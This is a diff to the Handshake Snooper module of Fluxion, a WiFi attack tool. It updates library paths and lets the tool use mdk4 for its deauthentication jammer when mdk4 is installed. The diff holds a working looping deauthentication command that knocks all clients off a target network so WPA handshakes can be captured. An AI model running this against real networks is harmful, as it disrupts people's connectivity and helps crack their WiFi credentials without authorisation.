@@ -6,14 +6,12 @@
 
 HandshakeSnooperState="Not Ready"
 
-
 # ============================================================ #
 # ========= < Handshake Snooper Helper Subroutines > ========= #
 # ============================================================ #
 handshake_snooper_header() {
   fluxion_header; fluxion_target_show; echo
 }
-
 
 # ============================================================ #
 # ============= < Handshake Snooper Subroutines > ============ #
@@ -45,8 +43,8 @@ handshake_snooper_arbiter_daemon() {
 
   trap handshake_snooper_arbiter_daemon_abort SIGABRT
 
-  source lib/HashUtils.sh
-  source lib/ColorUtils.sh
+  source "$FLUXIONLibPath/HashUtils.sh"
+  source "$FLUXIONLibPath/ColorUtils.sh"
 
   # Cleanup files we've previously created to avoid conflicts.
   sandbox_remove_workfile "$FLUXIONWorkspacePath/capture/dump-*"
@@ -183,10 +181,18 @@ handshake_snooper_start_deauthenticator() {
       HandshakeSnooperDeauthenticatorPID=$!
     ;;
     "$HandshakeSnooperMdk3MethodOption")
-      xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
-        -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
-        "while true; do sleep 7; timeout 3 mdk3 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk3_blacklist.lst -c $FluxionTargetChannel; done" &
-      HandshakeSnooperDeauthenticatorPID=$!
+        if ! [ -x "$(command -v mdk4)" ];then
+            xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
+                -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
+                "while true; do sleep 7; timeout 3 mdk3 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk3_blacklist.lst -c $FluxionTargetChannel; done" &
+            HandshakeSnooperDeauthenticatorPID=$!
+        else
+            xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
+                -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
+                "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk3_blacklist.lst -c $FluxionTargetChannel; done" &
+            HandshakeSnooperDeauthenticatorPID=$!
+        fi
+
     ;;
   esac
 }
@@ -364,7 +370,7 @@ if [ ! "$HandshakeSnooperCLIArguments" ]; then
     getopt --options="v:i:j:a" \
       --longoptions="verifier:,interval:,jammer:,asynchronous" \
       --name="Handshake Snooper V$FLUXIONVersion.$FLUXIONRevision" -- "$@"
-    ); then
+    );then
     echo -e "${CRed}Aborted$CClr, parameter error detected..."
     sleep 5
     fluxion_handle_exit
